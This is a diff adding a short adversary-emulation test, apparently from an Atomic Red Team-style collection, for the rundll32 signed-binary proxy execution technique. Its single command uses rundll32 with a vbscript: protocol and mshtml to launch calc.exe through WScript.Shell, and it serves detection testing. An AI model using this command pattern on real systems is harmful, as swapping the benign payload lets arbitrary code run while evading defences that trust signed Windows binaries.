@@ -1,0 +1,8 @@
+#TechniqueName: Signed Binary Proxy Execution: Rundll32
+#AtomicTestName: Rundll32 execute VBscript command
+#Description: Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.&Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/&Upon execution calc.exe will be launched&
+#Language: cmd
+
+#commands
+rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
+
